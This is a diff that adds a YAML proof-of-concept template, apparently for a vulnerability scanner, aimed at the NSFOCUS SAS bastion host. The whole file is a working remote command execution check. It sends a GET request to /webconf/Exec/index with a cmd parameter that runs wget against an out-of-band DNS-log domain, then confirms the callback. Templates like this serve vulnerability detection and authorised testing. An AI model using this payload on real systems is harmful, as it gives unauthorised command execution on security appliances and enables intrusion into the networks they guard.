@@ -1,0 +1,17 @@
+id: poc-yaml-lvmeng-sas-exec-rce
+info:
+  name: 绿盟-SAS堡垒机-Exec-Rce
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  - 两高一弱
+  finger: SAS堡垒机
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /webconf/Exec/index?cmd=wget%20{{.reverseDomain}}
+  expression: status_code == 200 && reverse.Verify()
+transport: http
